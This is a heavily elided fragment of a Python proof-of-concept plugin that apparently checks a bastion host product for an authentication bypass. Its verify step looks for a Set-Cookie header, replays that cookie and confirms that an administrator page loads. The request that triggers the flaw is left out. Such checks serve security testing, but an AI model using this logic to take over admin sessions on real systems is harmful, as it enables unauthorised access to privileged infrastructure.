  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        try:
            ...
            if resq.status_code == 200 and '"status":200' in resq.text and resq.headers['Set-Cookie']:
                admin_Cookie = resq.headers['Set-Cookie']
                resq_2  = Session.get(url=self.url,headers=headers,cookies=admin_Cookie,timeout=5,verify=False)
                if 'admin(堡垒机管理员)' in resq_2.text:
                    result['VerifyInfo'] = {}
